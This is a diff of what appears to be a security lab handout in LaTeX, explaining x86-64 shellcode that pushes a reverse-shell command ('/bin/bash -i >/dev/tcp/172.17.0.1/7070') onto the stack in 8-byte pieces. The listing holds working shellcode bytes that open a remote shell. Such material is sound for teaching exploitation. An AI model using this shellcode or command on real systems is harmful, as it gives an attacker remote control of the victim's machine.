@@ -12,31 +12,40 @@ rev_shell= (
    "\x48\x31\xc0\x50\x48\xb8\x2f\x2f\x2f\x2f\x62\x61\x73\x68\x50\x48"
    "\xb8\x2f\x2f\x2f\x2f\x2f\x62\x69\x6e\x50\x48\x89\xe3\x48\x31\xc0"
    "\x50\x48\xb8\x2d\x63\x63\x63\x63\x63\x63\x63\x50\x48\x89\xe1\x48"
-   "\x31\xc0\x50\x48\xb8\x20\x20\x20\x20\x32\x3e\x26\x31\x50\x48\xb8"
-   "\x20\x20\x20\x20\x30\x3c\x26\x31\x50\x48"
-   ##################################################
-   "\xb8" "0.1/7070" "\x50\x48"    (*@\ding{192}@*)
-   "\xb8" "/172.17." "\x50\x48"    (*@\ding{193}@*)
-   ##################################################
-   "\xb8\x2f\x64\x65\x76\x2f\x74\x63\x70\x50\x48\xb8\x68\x20\x2d\x69"
-   "\x20\x3e\x20\x20\x50\x48\xb8\x2f\x62\x69\x6e\x2f\x62\x61\x73\x50"
-   "\x48\x89\xe2\x48\x31\xc0\x50\x52\x51\x53\x48\x89\xe6\x48\x89\xdf"
+   "\x31\xc0\x50\x48"
+   ####################################
+   "\xb8" "    2>&1" "\x50\x48"   (*@\ding{108}@*)
+   "\xb8" "    0<&1" "\x50\x48"
+   "\xb8" "        " "\x50\x48"
+   "\xb8" "0.1/7070" "\x50\x48"   (*@\ding{109}@*)
+   "\xb8" "/172.17." "\x50\x48"   (*@\ding{109}@*)
+   "\xb8" "/dev/tcp" "\x50\x48"
+   "\xb8" "h -i >  " "\x50\x48"
+   "\xb8" "/bin/bas" "\x50\x48"   (*@\ding{108}@*)
+   ####################################
+   "\x89\xe2\x48\x31\xc0\x50\x52\x51\x53\x48\x89\xe6\x48\x89\xdf"
    "\x48\x31\xd2\x48\x31\xc0\xb0\x3b\x0f\x05"
 ).encode('latin-1')
 \end{lstlisting}
 
-The objective of Lines \ding{192} and \ding{193} is to
-save the IP address and port number part of the reverse shell
-command string into the stack. These two lines have the same instructions:
-they each saves (\textbackslash\texttt{xb8}) a 8-byte number to the \texttt{rax} register and
-then pushes (\textbackslash\texttt{x50}\textbackslash\texttt{x48})
-the value of this register into the stack. After running these
-two lines of instructions, the following string will be stored on the stack.
+The objective of lines between the two \ding{108} marks is to 
+push the reverse shell command into the stack. The string
+is divided into several pieces, each having exactly 8 bytes.
+These pieces are then pushed into the stack in the reverse order (because
+stack grows from high addresses to low addresses).
+Each line of the code does the same thing:
+save (\textbackslash\texttt{xb8}) a 8-byte number to the \texttt{rax} register, 
+and then pushes (\textbackslash\texttt{x50}\textbackslash\texttt{x48})
+the value of this register into the stack. 
+After running these lines of instructions, 
+the following revser shell command will be stored on the stack.
 
 \begin{lstlisting}
-/172.17.0.1/7070
+/bin/bash -i >/dev/tcp/172.17.0.1/7070 0<&1 2>&1
 \end{lstlisting}
 
+The IP address and port number part of the reverse shell command 
+are in the lines marked by \ding{109}. 
 If your server has a different IP address and/or port number,
 you need to modify these lines. You need to make sure that
 each line takes string that is exactly 8 bytes. If your string is shorter,
